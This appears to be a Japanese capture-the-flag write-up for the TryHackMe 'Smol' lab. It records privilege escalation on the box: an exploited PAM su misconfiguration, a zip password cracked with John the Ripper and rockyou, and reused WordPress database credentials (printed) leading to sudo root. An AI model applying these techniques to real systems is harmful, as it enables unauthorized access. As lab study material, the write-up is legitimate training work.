  System information as of Wed 09 Jul 2025 06:07:22 PM UTC

  System load:  0.24              Processes:             143
  Usage of /:   57.5% of 9.75GB   Users logged in:       0
  Memory usage: 20%               IPv4 address for ens5: 10.10.128.4
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

162 updates can be applied immediately.
125 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

think@smol:~$ 

```

なんか色んなグループに属してる？
- devとinternalという2つのグループに属してるねえ
```bash
think@smol:~$ id
uid=1000(think) gid=1000(think) groups=1000(think),1004(dev),1005(internal)

```

```bash
think@smol:~$ find / -type f -perm -04000 -ls 2>/dev/null
     3279     24 -rwsr-xr-x   1 root     root        22840 Feb 21  2022 /usr/lib/policykit-1/polkit-agent-helper-1
    55933    464 -rwsr-xr-x   1 root     root       473576 Aug  4  2023 /usr/lib/openssh/ssh-keysign
     1383     16 -rwsr-xr-x   1 root     root        14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
     9110     52 -rwsr-xr--   1 root     messagebus    51344 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
      491     56 -rwsr-sr-x   1 daemon   daemon        55560 Nov 12  2018 /usr/bin/at
      672     40 -rwsr-xr-x   1 root     root          39144 Mar  7  2020 /usr/bin/fusermount
      480     88 -rwsr-xr-x   1 root     root          88464 Nov 29  2022 /usr/bin/gpasswd
      178     84 -rwsr-xr-x   1 root     root          85064 Nov 29  2022 /usr/bin/chfn
     2463    164 -rwsr-xr-x   1 root     root         166056 Apr  4  2023 /usr/bin/sudo
      184     52 -rwsr-xr-x   1 root     root          53040 Nov 29  2022 /usr/bin/chsh
      547     68 -rwsr-xr-x   1 root     root          68208 Nov 29  2022 /usr/bin/passwd
     9965     56 -rwsr-xr-x   1 root     root          55528 May 30  2023 /usr/bin/mount
    14014     68 -rwsr-xr-x   1 root     root          67816 May 30  2023 /usr/bin/su
     1235     44 -rwsr-xr-x   1 root     root          44784 Nov 29  2022 /usr/bin/newgrp
     3277     32 -rwsr-xr-x   1 root     root          31032 Feb 21  2022 /usr/bin/pkexec
     9972     40 -rwsr-xr-x   1 root     root          39144 May 30  2023 /usr/bin/umount

```

CVE-2021-3156があるかと思ったけど、なさそう
- https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit
- 「You can check your version of sudo is vulnerable with: `$ sudoedit -s Y`. If it asks for your password it's most likely vulnerable, if it prints usage information it isn't.」
```bash
think@smol:~$ sudoedit -s Y
usage: sudoedit [-AknS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt] [-T timeout] [-u user] file ...
```

```sh
/var/www/wordpress/wp-config.php
/var/www/wordpress/wp-content/plugins/akismet/views/config.php
/var/www/wordpress/wp-content/themes/twentytwentyone/assets/sass/05-blocks/_config.scss
/var/www/wordpress/wp-content/themes/twentytwentyone/postcss.config.js
/var/www/wordpress/wp-config-sample.php
/var/www/wordpress/wp-admin/setup-config.php
/var/cache/debconf/config.dat
/var/cache/debconf/config.dat-old
/etc/python3/debian_config
/etc/cloud/cloud.cfg.d/99-disable-network-config.cfg
/etc/cloud/cloud.cfg.d/vmimport.99-disable-network-config.cfg
/etc/manpath.config
/etc/netplan/00-installer-config.yaml.vmimport
/etc/ssh/ssh_config
/etc/ssh/sshd_config


```


```sh
think@smol:~$ echo $PATH
.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

```

/homeで、`ls -la -R`で、すべてのファイルを表示してみると、/gegeにwordpress.old.zipがあることがわかった
```sh
./gege:
total 31532
drwxr-x--- 2 gege internal     4096 Aug 18  2023 .
drwxr-xr-x 6 root root         4096 Aug 16  2023 ..
lrwxrwxrwx 1 root root            9 Aug 18  2023 .bash_history -> /dev/null
-rw-r--r-- 1 gege gege          220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 gege gege         3771 Feb 25  2020 .bashrc
-rw-r--r-- 1 gege gege          807 Feb 25  2020 .profile
lrwxrwxrwx 1 root root            9 Aug 18  2023 .viminfo -> /dev/null
-rwxr-x--- 1 root gege     32266546 Aug 16  2023 wordpress.old.zip


```

しかし、所有権は、rootかgegeにしかないため取得できない
- だけど、gegeへの横展開の仕方がわからない
- ここで詰まった
```sh
think@smol:/home$  gege/wordpress.old.zip |base64 -w 0;echo
cat: gege/wordpress.old.zip: Permission denied
```

**PAMの設定を利用した認証バイパス**・su権限の委譲 / 管理用の設定を使って、gegeに横展開できる
- https://jaxafed.github.io/posts/tryhackme-smol/#shell-as-gege

/etc/pam.d/suは、suコマンドのためのPAM設定ファイル
```sh
gege@smol:/home$ cat /etc/pam.d/su
#
# The PAM configuration file for the Shadow `su' service
#

# This allows root to su without passwords (normal operation)
auth       sufficient pam_rootok.so
auth  [success=ignore default=1] pam_succeed_if.so user = gege
auth  sufficient                 pam_succeed_if.so use_uid user = think
# Uncomment this to force users to be a member of group root
# before they can use `su'. You can also add "group=foo"
# to the end of this line if you want to use a group other
# than the default "root" (but this may have side effect of
# denying "root" user, unless she's a member of "foo" or explicitly
# permitted earlier by e.g. "sufficient pam_rootok.so").
# (Replaces the `SU_WHEEL_ONLY' option from login.defs)
# auth       required   pam_wheel.so

# Uncomment this if you want wheel members to be able to
# su without a password.
# auth       sufficient pam_wheel.so trust

# Uncomment this if you want members of a specific group to not
# be allowed to use su at all.
# auth       required   pam_wheel.so deny group=nosu

# Uncomment and edit /etc/security/time.conf if you need to set
# time restrainst on su usage.
# (Replaces the `PORTTIME_CHECKS_ENAB' option from login.defs
# as well as /etc/porttime)
# account    requisite  pam_time.so

# This module parses environment configuration file(s)
# and also allows you to use an extended config
# file /etc/security/pam_env.conf.
# 
# parsing /etc/environment needs "readenv=1"
session       required   pam_env.so readenv=1
# locale variables are also kept into /etc/default/locale in etch
# reading this file *in addition to /etc/environment* does not hurt
session       required   pam_env.so readenv=1 envfile=/etc/default/locale

# Defines the MAIL environment variable
# However, userdel also needs MAIL_DIR and MAIL_FILE variables
# in /etc/login.defs to make sure that removing a user 
# also removes the user's mail spool file.
# See comments in /etc/login.defs
#
# "nopen" stands to avoid reporting new mail when su'ing to another user
session    optional   pam_mail.so nopen

# Sets up user limits according to /etc/security/limits.conf
# (Replaces the use of /etc/limits in old login)
session    required   pam_limits.so

# The standard Unix authentication modules, used with
# NIS (man nsswitch) as well as normal /etc/passwd and
# /etc/shadow entries.
@include common-auth
@include common-account
@include common-session

```


注目すべき部分
- 1行目: suコマンドで切り替えようとしている先のユーザーがgegeであるかどうかをチェックする。もしgegeでなければ、次の行のルールは無視される
- 2行目: suコマンドを実行している元のユーザーがthinkであるかどうかをチェックする。もしthinkであれば、認証は成功とみなされ、パスワードは不要になる
この2行によって、**thinkユーザーはパスワードなしでgegeユーザーになることができる**というルールが実現されている
```sh
auth  [success=ignore default=1] pam_succeed_if.so user = gege
auth  sufficient                 pam_succeed_if.so use_uid user = think
```

この設定で、thinkからgegeに切り替えられる
```sh
think@smol:/home$ su gege
gege@smol:/home$
```

wordpress.old.zipの中身に何かあるかと思い、解凍しようとしたが、パスワードがかかっている
```sh
gege@smol:~$ unzip wordpress.old.zip
Archive:  wordpress.old.zip
   creating: wordpress.old/
[wordpress.old.zip] wordpress.old/wp-config.php password: 

```

攻撃元に、ファイルごと転送し、rockyou.txtでブルートフォースする
```sh
zip2john wordpress.old.zip > zip.hash

john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
hero_gege@hotmail.com (wordpress.old.zip)     
1g 0:00:00:00 DONE (2025-07-09 23:28) 1.123g/s 8573Kp/s 8573Kc/s 8573KC/s hesse..hemys
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

パスワードは、`hero_gege@hotmail.com`だとわかったので、解凍する'
そして、wp-config.php内に、DB_USERとDB_PASSWORDがあり、ここが現在のと異なっていて、xaviになっている
```sh
┌──(kali㉿kali)-[~/…/THM/machine/Smol/wordpress.old]
└─$ cat wp-config.php
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the web site, you can copy this file to "wp-config.php"
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/documentation/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'xavi' );

/** Database password */
define( 'DB_PASSWORD', 'P@ssw0rdxavi@' );

```

### xaviの認証情報
xavi : P@ssw0rdxavi@

sshで接続しているthinkのターミナルの中で、gegeから、xaviに切り替える
```sh
gege@smol:~$ su xavi
Password: 
xavi@smol:/home/gege$ ls

```

sudo -lをしたら、xaviユーザーは管理者権限を持ってるとわかった
```sh
xavi@smol:/home/gege$ sudo -l
[sudo] password for xavi: 
Matching Defaults entries for xavi on smol:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User xavi may run the following commands on smol:
    (ALL : ALL) ALL

```

これで、root.txtも取得できる
```sh
xavi@smol:/home/gege$ sudo su root
root@smol:~$ cat root.txt
```

## Notes
`cat /etc/pam.d/su`に設定ミス・管理用の記述がないかを見る！！！！！！！！！
- 横展開の鍵になる


# 詰まったところ
## gegeユーザーへの横展開
- パスワードもクラックできない
- gegeユーザーにならないとファイルが読めないけど、どう横展開すればいいのか、手詰まりになってしまった


解決方法
`cat /etc/pam.d/su`に設定ミス・管理用の記述がないかを見る！！！！！！！！！


# 参考
room : https://tryhackme.com/room/smol
Writeup 
- https://jaxafed.github.io/posts/tryhackme-smol/#shell-as-gege
- https://0xb0b.gitbook.io/writeups/tryhackme/2025/smol#shell-as-xavi
